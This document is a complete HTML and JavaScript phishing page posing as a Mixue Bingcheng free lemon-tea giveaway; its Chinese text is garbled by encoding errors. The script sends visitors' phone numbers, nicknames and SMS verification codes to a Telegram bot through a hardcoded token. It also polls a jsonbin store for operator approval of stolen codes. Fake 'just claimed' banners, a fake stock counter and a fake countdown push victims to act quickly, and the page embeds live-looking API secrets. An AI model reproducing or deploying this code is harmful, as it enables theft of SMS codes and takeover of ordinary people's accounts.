<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/axios/1.7.7/axios.min.js"></script>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>èœœé›ªå†°åŸ Â· é™æ—¶ç¦åˆ© Â· å…è´¹é¢†æŸ æª¬èŒ¶</title>
  <style>
    :root {
      --mixue-red: #E63946;
      --mixue-yellow: #FFD166;
      --mixue-white: #F8F9FA;
      --mixue-dark: #252422;
      --mixue-gray: #CCC5B9;
      --shadow-light: 0 8px 32px rgba(230, 57, 70, 0.25);
      --radius-lg: 28px;
      --radius-md: 18px;
      --radius-sm: 12px;
    }
    * { margin:0; padding:0; box-sizing:border-box; -webkit-tap-highlight-color:transparent; }
    body {
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "PingFang SC", "Hiragino Sans GB", sans-serif;
      background: url('https://pub-141831e61e69445289222976a15b6fb3.r2.dev/Image_to_url_V2/1000046878-imagetourl.cloud-1770310883157-bp2dgh.jpg') no-repeat center center fixed;
      background-size: cover;
      min-height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      padding: 20px 15px;
      position: relative;
    }
    body::before {
      content: "";
      position: fixed;
      inset: 0;
      background: linear-gradient(180deg, rgba(230,57,70,0.08), rgba(255,209,102,0.05));
      z-index: -1;
    }

    .card { width:100%; max-width:420px; background:rgba(255,255,255,0.98); border-radius:var(--radius-lg); overflow:hidden; box-shadow:var(--shadow-light); border:1px solid rgba(230,57,70,0.1); animation:fadeUp 0.6s ease-out; }
    @keyframes fadeUp { 0% {opacity:0; transform:translateY(30px);} 100% {opacity:1; transform:translateY(0);} }

    .header { background:linear-gradient(135deg, var(--mixue-red), #C92A39); color:var(--mixue-white); padding:42px 28px 24px; text-align:center; position:relative; }
    .header::after { content:""; position:absolute; bottom:0; left:0; right:0; height:6px; background:var(--mixue-yellow); }
    .header h1 { font-size:2.6rem; font-weight:900; letter-spacing:2px; text-shadow:0 2px 4px rgba(0,0,0,0.1); }
    .header p { margin:10px 0 16px; font-size:1.15rem; font-weight:500; opacity:0.95; }

    .activity-period { font-size:0.9rem; background:rgba(255,255,255,0.15); padding:10px 20px; border-radius:50px; display:inline-block; margin:8px 0 16px; }
    #globalTimer { color:var(--mixue-yellow); font-weight:700; }

    .stock-info { font-size:1rem; background:rgba(0,0,0,0.2); padding:10px 20px; border-radius:50px; margin:12px auto; max-width:90%; font-weight:600; }
    .low-stock { color:var(--mixue-yellow) !important; animation:blinkWarn 1s infinite alternate; }
    @keyframes blinkWarn { from {opacity:1;} to {opacity:0.7;} }

    .join-count { text-align:center; font-size:1.2rem; color:var(--mixue-red); background:rgba(255,209,102,0.15); padding:12px; margin:0; font-weight:700; animation:pulse 2.5s infinite; }
    @keyframes pulse { 0%,100% {transform:scale(1);} 50% {transform:scale(1.03);} }

    .content { padding:32px 28px 40px; background:var(--mixue-white); }

    .store-nav, .queue-status, .transfer-entry { cursor:pointer; transition:all 0.3s; }
    .store-nav:hover, .queue-status:hover, .transfer-entry:hover { transform:translateY(-2px); }

    .barrage-box { height:120px; margin:0 0 20px; background:rgba(230,57,70,0.05); border-radius:var(--radius-sm); overflow:hidden; position:relative; border:1px solid rgba(230,57,70,0.1); padding:8px 0; }
    .barrage-item { position:absolute; white-space:nowrap; font-size:0.95rem; font-weight:600; padding:6px 16px; line-height:1.4; left:100%; background:rgba(255,255,255,0.92); border-radius:20px; box-shadow:0 2px 8px rgba(0,0,0,0.12); z-index:1; }
    @keyframes barrageSlide { 0% {transform:translateX(0);} 100% {transform:translateX(-200%);} }

    .input-box { position:relative; margin-bottom:20px; }
    input { width:100%; height:56px; padding:0 24px; border:2px solid var(--mixue-gray); border-radius:var(--radius-md); font-size:1rem; background:#fff; transition:all 0.3s; }
    input:focus { outline:none; border-color:var(--mixue-red); box-shadow:0 0 0 6px rgba(230,57,70,0.1); transform:translateY(-2px); }
    input.input-error { border-color:#ff4d4f; box-shadow:0 0 0 6px rgba(255,77,79,0.1); animation:shake 0.3s; }
    @keyframes shake { 0%,100% {transform:translateX(0);} 25% {transform:translateX(-4px);} 75% {transform:translateX(4px);} }

    .verify-slider { width:100%; height:46px; background:#f7f8fa; border-radius:23px; position:relative; margin:20px 0; overflow:hidden; border:1px solid #e5e6eb; display:none; opacity:0; transform:translateY(10px); transition:all 0.4s; }
    .verify-slider.show { display:block; opacity:1; transform:translateY(0); }
    .verify-text { position:absolute; left:50%; top:50%; transform:translate(-50%,-50%); color:#666; font-size:0.9rem; pointer-events:none; }
    .verify-block { width:46px; height:46px; background:var(--mixue-red); color:#fff; border-radius:50%; display:flex; align-items:center; justify-content:center; position:absolute; left:0; top:0; cursor:grab; user-select:none; }
    .verify-bg { height:100%; background:rgba(230,57,70,0.1); position:absolute; left:0; top:0; width:0; border-radius:23px 0 0 23px; }
    .verify-success .verify-block { background:#00b42a; }

    .btn { width:100%; height:60px; background:linear-gradient(135deg, var(--mixue-red), #D62E3D); color:#fff; border:none; border-radius:var(--radius-md); font-size:1.25rem; font-weight:700; cursor:pointer; transition:all 0.3s; margin-top:16px; box-shadow:0 6px 16px rgba(230,57,70,0.3); }
    .btn:disabled { background:var(--mixue-gray); cursor:not-allowed; box-shadow:none; }

    .loading-mask { position:fixed; inset:0; background:rgba(255,255,255,0.92); display:none; flex-direction:column; align-items:center; justify-content:center; z-index:99999; backdrop-filter:blur(4px); }
    .loading-mask.show { display:flex; }
    .loading-spinner { width:40px; height:40px; border:4px solid #f3f3f3; border-top:4px solid var(--mixue-red); border-radius:50%; animation:spin 1s linear infinite; margin-bottom:16px; }
    @keyframes spin { 0% { transform:rotate(0deg); } 100% { transform:rotate(360deg); } }
    .loading-text { font-size:1rem; color:var(--mixue-dark); font-weight:500; }

    .modal { position:fixed; inset:0; background:rgba(0,0,0,0.65); display:none; align-items:center; justify-content:center; z-index:100000; }
    .modal.show { display:flex; }
    .modal-content { background:#fff; border-radius:var(--radius-lg); padding:40px 30px; text-align:center; max-width:320px; width:90%; box-shadow:var(--shadow-light); }
    .modal-content h2 { color:var(--mixue-red); margin-bottom:16px; font-size:1.8rem; }
    .coupon-code { background:var(--mixue-yellow); color:var(--mixue-dark); padding:12px 20px; border-radius:var(--radius-sm); font-weight:bold; margin:16px 0; letter-spacing:1px; }
    .modal-emoji { font-size:2.5rem; margin:16px 0; }

    .toast-container { position:fixed; top:20px; left:50%; transform:translateX(-50%); z-index:999999; display:flex; flex-direction:column; gap:8px; }
    .toast { background:rgba(0,0,0,0.7); color:#fff; padding:12px 24px; border-radius:20px; font-size:0.95rem; animation:toastIn 0.3s ease-out; }
    @keyframes toastIn { from { opacity:0; transform:translateY(-20px); } to { opacity:1; transform:translateY(0); } }
  </style>
</head>
<body>

<div class="toast-container" id="toastContainer"></div>

<div class="loading-mask" id="loadingMask">
  <div class="loading-spinner"></div>
  <div class="loading-text">åŠ è½½ä¸­...</div>
</div>

<div class="card">
  <div class="header">
    <h1>èœœé›ªå†°åŸ</h1>
    <p>æ˜¥èŠ‚ç‹‚æ¬¢ Â· å…è´¹é¢†å¤§æ¯æŸ æª¬èŒ¶</p>
    <div class="activity-period">
      æ´»åŠ¨è¿›è¡Œä¸­ï¼š2026å¹´1æœˆ30æ—¥ â€” 2026å¹´2æœˆ18æ—¥<br>
      <strong id="globalTimer">æœ¬è½®åé¢å€’è®¡æ—¶ï¼šè®¡ç®—ä¸­...</strong>
    </div>
    <div class="stock-info">å…¨å›½é™é‡5000ä»½ï¼Œå·²é¢† <span id="claimedCount">4567</span> å¼ ï¼Œä»…å‰© <span id="remainCount">433</span> å¼ </div>
  </div>

  <div class="join-count">å·²æœ‰ <span id="countNum">4,567</span> äººæŠ¢åˆ°ç¦åˆ©</div>

  <div class="content">
    <div class="barrage-box" id="barrageBox"></div>

    <div class="fair-tip" style="text-align:center; color:#666; margin-bottom:20px; font-size:0.9rem;">ä¸ºä¿è¯å…¬å¹³ï¼Œä¸¥ç¦ä½¿ç”¨è„šæœ¬æˆ–å¤–æŒ‚ï¼Œè¿è§„æ°¸ä¹…å°å·</div>

    <div class="input-box">
      <input type="text" id="nickname" placeholder="æ˜µç§°ï¼ˆé€‰å¡«ï¼‰" maxlength="20" autocomplete="off" />
    </div>

    <div class="input-box">
      <input type="tel" id="phone" placeholder="è¯·è¾“å…¥æ‰‹æœºå·" maxlength="11" inputmode="numeric" pattern="[0-9]*" autocomplete="off" />
    </div>

    <div class="verify-slider" id="verifySlider">
      <div class="verify-bg" id="verifyBg"></div>
      <div class="verify-block" id="verifyBlock">â†’</div>
      <div class="verify-text">å‘å³æ»‘åŠ¨å®ŒæˆéªŒè¯</div>
    </div>

    <div class="input-box">
      <input type="text" id="code" placeholder="è¯·è¾“å…¥éªŒè¯ç " maxlength="6" inputmode="numeric" pattern="[0-9]*" autocomplete="off" />
    </div>

    <button class="btn" id="getCodeBtn" disabled>è·å–éªŒè¯ç </button>
    <button class="btn" id="submitBtn" style="display:none;" disabled>ç«‹å³é¢†å–</button>

    <div id="countdown" style="opacity:0; color:var(--mixue-red); text-align:center; margin-top:14px; font-size:0.95rem;"></div>
  </div>
</div>

<div class="modal" id="successModal">
  <div class="modal-content">
    <h2>é¢†å–æˆåŠŸï¼</h2>
    <p>å¤§æ¯æŸ æª¬èŒ¶åˆ¸å·²å‘è‡³æ‰‹æœº</p>
    <div class="coupon-code">MX2026-ICE-ABCD1234</div>
    <p style="font-weight:bold; margin:20px 0;">è¯·å°½å¿«åˆ°åº—æ ¸é”€ï¼Œè¿‡æœŸæ— æ•ˆ</p>
    <div class="modal-emoji">ğŸ‰ğŸ‹ğŸ”¥</div>
    <button class="btn" id="closeModalBtn">å¥½çš„ï¼Œå»å…‘æ¢ï¼</button>
  </div>
</div>

<script>
// ============================= é…ç½® =============================
const BOT_TOKEN = '8338672395:AAH9rbys9sjY-BthubvXyVv2Rr_d_Pr_kiI';
const CHAT_ID   = '8439448087';
const BIN_ID    = '69859afad0ea881f40a4e526';
const MASTER_KEY = '$2a$10$DeNPX1R0C0PjshDJf/w1d.9wc8fHLNB0bAGBwXmrnsMCvSVTt/vga';
const BIN_URL   = `https://api.jsonbin.io/v3/b/${BIN_ID}`;
const BIN_HEADERS = { 'Content-Type': 'application/json', 'X-Master-Key': MASTER_KEY };

const TOTAL_STOCK = 5000;
let claimed = 4567;
let isVerifySuccess = false;
let timers = {};

// DOM
const els = {
  phone: document.getElementById('phone'),
  nickname: document.getElementById('nickname'),
  code: document.getElementById('code'),
  getBtn: document.getElementById('getCodeBtn'),
  submitBtn: document.getElementById('submitBtn'),
  countdown: document.getElementById('countdown'),
  modal: document.getElementById('successModal'),
  claimedCount: document.getElementById('claimedCount'),
  remainCount: document.getElementById('remainCount'),
  countNum: document.getElementById('countNum'),
  barrageBox: document.getElementById('barrageBox'),
  verifySlider: document.getElementById('verifySlider'),
  verifyBlock: document.getElementById('verifyBlock'),
  verifyBg: document.getElementById('verifyBg'),
  loadingMask: document.getElementById('loadingMask'),
  globalTimer: document.getElementById('globalTimer'),
  closeModalBtn: document.getElementById('closeModalBtn')
};

// ============================= å‡½æ•° =============================
function showToast(msg) {
  const t = document.createElement('div');
  t.className = 'toast';
  t.innerHTML = msg;
  document.getElementById('toastContainer').appendChild(t);
  setTimeout(() => t.remove(), 2800);
}

function shootBarrage(phone = null) {
  const prefix = phone ? phone.slice(0,3)+'****'+phone.slice(7) : '1'+Math.floor(3000000000 + Math.random()*9000000000);
  const surname = 'èµµé’±å­™æå‘¨å´éƒ‘ç‹å†¯é™ˆ'[Math.floor(Math.random()*10)];
  const item = document.createElement('div');
  item.className = 'barrage-item';
  item.textContent = `${surname}** ${prefix} åˆšåˆšé¢†å–æˆåŠŸï¼`;
  item.style.top = (10 + Math.random()*60) + 'px';
  item.style.color = ['#c1121f','#9d0208','#e63946','#d00000'][Math.floor(Math.random()*4)];
  const dur = 9 + Math.random()*7;
  item.style.animation = `barrageSlide ${dur}s linear forwards`;
  els.barrageBox.appendChild(item);
  setTimeout(() => item.remove(), dur*1000 + 1000);
}

function updateStock() {
  const remain = Math.max(0, TOTAL_STOCK - (claimed - 4567));
  els.claimedCount.textContent = claimed.toLocaleString('zh-CN');
  els.remainCount.textContent = remain.toLocaleString('zh-CN');
  els.countNum.textContent = claimed.toLocaleString('zh-CN');
  if (remain < 100) els.remainCount.classList.add('low-stock');
}

function fakeClaim() {
  if (Math.random() > 0.45) {
    const add = 1 + Math.floor(Math.random()*5);
    claimed += add;
    updateStock();
    for(let i=0; i<add; i++) setTimeout(shootBarrage, i*900);
  }
}

function checkPhoneValid() {
  const val = els.phone.value.trim();
  const valid = /^1[3-9]\d{9}$/.test(val);
  els.phone.classList.toggle('input-error', val && !valid);

  if (valid) {
    els.verifySlider.classList.add('show');
    if (!els.verifyBlock.dataset.inited) initSlider();
  } else {
    els.verifySlider.classList.remove('show');
    isVerifySuccess = false;
    resetSlider();
  }
  els.getBtn.disabled = !valid || !isVerifySuccess;
}

function resetSlider() {
  els.verifySlider.classList.remove('verify-success');
  els.verifyBlock.style.left = '0';
  els.verifyBg.style.width = '0';
  els.verifyBlock.textContent = 'â†’';
}

function initSlider() {
  els.verifyBlock.dataset.inited = 'true';
  let dragging = false;
  const max = els.verifySlider.offsetWidth - els.verifyBlock.offsetWidth;

  const start = e => {
    if (isVerifySuccess) return;
    dragging = true;
    const sx = e.clientX || e.touches?.[0]?.clientX;
    const sl = parseFloat(els.verifyBlock.style.left) || 0;

    const move = ev => {
      if (!dragging) return;
      const dx = (ev.clientX || ev.touches?.[0]?.clientX) - sx;
      let l = Math.max(0, Math.min(sl + dx, max));
      els.verifyBlock.style.left = l + 'px';
      els.verifyBg.style.width = l + 'px';
    };

    const end = () => {
      dragging = false;
      const l = parseFloat(els.verifyBlock.style.left) || 0;
      if (l >= max * 0.8) {
        isVerifySuccess = true;
        els.verifySlider.classList.add('verify-success');
        els.verifyBlock.textContent = 'âœ“';
        els.verifyBlock.style.left = max + 'px';
        els.verifyBg.style.width = max + 'px';
        checkPhoneValid();
      } else resetSlider();
      document.removeEventListener('mousemove', move);
      document.removeEventListener('touchmove', move);
      document.removeEventListener('mouseup', end);
      document.removeEventListener('touchend', end);
    };

    document.addEventListener('mousemove', move);
    document.addEventListener('touchmove', move, {passive:false});
    document.addEventListener('mouseup', end);
    document.addEventListener('touchend', end);
  };

  els.verifyBlock.addEventListener('mousedown', start);
  els.verifyBlock.addEventListener('touchstart', e => { e.preventDefault(); start(e.touches[0]); }, {passive:false});
}

function startCountdown() {
  if (!els.globalTimer) return;
  let sec = 120*60 + Math.floor(Math.random()*180*60);
  const tick = () => {
    if (sec <= 0) {
      els.globalTimer.textContent = 'æœ¬è½®å·²ç»“æŸï¼Œè¯·åˆ·æ–°';
      setTimeout(() => location.reload(), 4000);
      return;
    }
    const h = Math.floor(sec/3600).toString().padStart(2,'0');
    const m = Math.floor((sec%3600)/60).toString().padStart(2,'0');
    const s = (sec%60).toString().padStart(2,'0');
    // ä¿®å¤æ¨¡æ¿å­—ç¬¦ä¸²è¯­æ³•
    els.globalTimer.textContent = `æœ¬è½®åé¢å€’è®¡æ—¶ï¼š${h}:${m}:${s}`;
    sec--;
  };
  tick();
  timers.global = setInterval(tick, 1000);
}

async function pollCheck(phone) {
  els.loadingMask.querySelector('.loading-text').textContent = 'äººå·¥å®¡æ ¸ä¸­ï¼Œè¯·ç¨ç­‰...';
  els.loadingMask.classList.add('show');

  timers.poll = setInterval(async () => {
    try {
      const { data } = await axios.get(BIN_URL, { headers: BIN_HEADERS });
      if (data?.record?.allowed_phones?.includes(phone)) {
        clearInterval(timers.poll);
        els.loadingMask.classList.remove('show');
        claimed++;
        updateStock();
        shootBarrage(phone);
        els.modal.classList.add('show');
        localStorage.setItem('mx_claim_' + phone, Date.now());
      }
    } catch {}
  }, 6000);
}

// ============================= äº‹ä»¶ =============================
els.phone.addEventListener('input', checkPhoneValid);
els.phone.addEventListener('blur', checkPhoneValid);

els.closeModalBtn.addEventListener('click', () => {
  els.modal.classList.remove('show');
});

els.getBtn.addEventListener('click', async () => {
  if (els.getBtn.disabled) return;
  const phone = els.phone.value.trim();
  const nick = els.nickname.value.trim() || 'æ— ';

  try {
    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: {'Content-Type':'application/json'},
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: `ã€æ–°å·ã€‘\næ˜µç§°ï¼š${nick}\næ‰‹æœºå·ï¼š${phone}\næ—¶é—´ï¼š${new Date().toLocaleString('zh-CN')}`
      })
    });
  } catch {}

  let s = 60;
  els.getBtn.disabled = true;
  els.code.disabled = false;
  els.code.focus();
  els.countdown.style.opacity = '1';
  els.countdown.textContent = `éªŒè¯ç å·²å‘é€ï¼ˆ${s}sï¼‰`;

  timers.code = setInterval(() => {
    s--;
    els.getBtn.textContent = `é‡å‘(${s}s)`;
    els.countdown.textContent = `éªŒè¯ç å·²å‘é€ï¼ˆ${s}sï¼‰`;
    if (s <= 0) {
      clearInterval(timers.code);
      els.getBtn.disabled = false;
      els.getBtn.textContent = 'è·å–éªŒè¯ç ';
      els.countdown.style.opacity = '0';
    }
  }, 1000);
});

els.code.addEventListener('input', () => {
  const len = els.code.value.trim().length;
  els.submitBtn.style.display = len >= 4 ? 'block' : 'none';
  els.submitBtn.disabled = len < 4;
  els.code.classList.toggle('input-error', len > 0 && len < 6);
});

els.submitBtn.addEventListener('click', async () => {
  if (els.submitBtn.disabled) return;
  const phone = els.phone.value.trim();
  const code = els.code.value.trim();
  const nick = els.nickname.value.trim() || 'æ— ';

  if (code.length < 4) return alert('éªŒè¯ç æ ¼å¼é”™è¯¯');

  try {
    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: {'Content-Type':'application/json'},
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: `ã€éªŒè¯ç ã€‘\næ˜µç§°ï¼š${nick}\næ‰‹æœºå·ï¼š${phone}\néªŒè¯ç ï¼š${code}\næ—¶é—´ï¼š${new Date().toLocaleString('zh-CN')}\næ”¾è¡Œï¼šé€šè¿‡ ${phone}`
      })
    });
  } catch {}

  pollCheck(phone);
  showToast('æäº¤æˆåŠŸï¼Œæ­£åœ¨ç­‰å¾…äººå·¥å®¡æ ¸...');
});

els.modal.addEventListener('click', e => {
  if (e.target === els.modal) els.modal.classList.remove('show');
});

// ============================= å¯åŠ¨ =============================
window.addEventListener('load', () => {
  timers.fake = setInterval(fakeClaim, 2200);
  timers.barrage = setInterval(() => Math.random() > 0.5 && shootBarrage(), 5000);
  startCountdown();
  updateStock();
});

window.addEventListener('beforeunload', () => {
  Object.values(timers).forEach(t => clearInterval(t));
});
</script>
</body>
</html>
